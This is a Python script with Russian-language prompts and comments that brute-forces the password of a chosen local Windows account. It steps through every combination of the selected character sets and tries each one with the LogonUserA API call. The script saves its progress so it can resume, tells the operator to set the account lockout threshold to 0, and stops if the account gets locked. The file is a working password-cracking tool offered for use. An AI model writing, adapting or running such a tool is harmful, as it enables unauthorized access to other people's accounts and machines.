import ctypes
import win32security
import subprocess
import win32api
import itertools
import string
import time
import json
import os
import sys

from list_users import list_users
from load_and_save_progress import load_progress, save_progress
from logo import logotip_password_checker

logotip = logotip_password_checker()

print("Убедитесь в том что у вас 'Пороговое значение блокировки: 0', иначе у вас заблокируют учетную запись!")

users_list = list_users()


LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

russian_letters = 'абвгдежзийклмнопрстуфхцчшщъыьэюяАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ'

characters = ''

progress_file = "progress.json"

digits_progress = 0
ascii_progress = 0
russian_letter_progress = 0
punc_progress = 0

# Загрузка прогресса
progress = load_progress()
if progress:
    account = progress['account']
    i = progress['length']
    try_id = progress['try_id']
    tryed = progress['tryed']
    characters = progress['characters']
else:
    i = 1
    try_id = 0
    tryed = []
    # Указываем имя пользователя и пароль
    while True:
        account = str(input("Введите имя учетной записи: "))
        if account in users_list:
            print("Учетная запись найдена")
            break
        else:
            print("Учетная запись не найдена!\n Введите имя учетной записи еще раз")

    level = 0
    req_types = ["Вы хотите использовать числа для подбора: ( Y/n ) ",
                 "Вы хотите использовать латинские буквы для подбора: ( Y/n ) ",
                 "Вы хотите использовать кириллицу для подбора: ( Y/n ) ",
                 "Вы хотите использовать специальные символы для подбора: ( Y/n ) "]

    while True:
        if level == 4:
            break
        level += 1
        digits = str(input(f"{req_types[level - 1]}: "))
        if digits.lower() in ["y", "д"]:
            if level == 1:
                characters += string.digits
                digits_progress += 1
            if level == 2:
                characters += string.ascii_letters
                ascii_progress += 1
            if level == 3:
                characters += russian_letters
                russian_letter_progress += 1
            if level == 4:
                characters += string.punctuation
                punc_progress += 1
        elif digits.lower() in ["n", "н"]:
            pass
        else:
            print("Вы неправильно ввели, а нужно ( y / n )!")
            level -= 1

username = account  # Замените на ваше имя пользователя

found = False
time_start = int(time.time())
try:
    while not found:
        for password in itertools.product(characters, repeat=i):
            password = "".join(password)
            if not password in tryed:
                try_id += 1
                # Попытка входа в систему
                token = ctypes.c_void_p()
                result = ctypes.windll.advapi32.LogonUserA(
                    username.encode('utf-8'),
                    None,  # Укажите домен, если необходимо
                    password.encode('utf-8'),
                    LOGON32_LOGON_INTERACTIVE,
                    LOGON32_PROVIDER_DEFAULT,
                    ctypes.byref(token)
                )

                if result:
                    print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
                    found = True
                    break
                else:
                    print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                    tryed.append(password)
                    if win32api.GetLastError() == 1909:
                        print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
                        sys.exit()

                # Сохраняем прогресс после каждой попытки
                save_progress(account,characters, i, try_id, tryed)

        # Увеличиваем длину пароля, если не нашли подходящий
        if not found:
            i += 1

except KeyboardInterrupt:

    save_progress(account,characters, i, try_id, tryed)
    print("Программа прервана. Прогресс сохранен.")

except Exception as ex:
    print("Произошла ошибка: ", ex)

time_finish = int(time.time() - time_start)
print(f"{time_finish} секунд(ы)")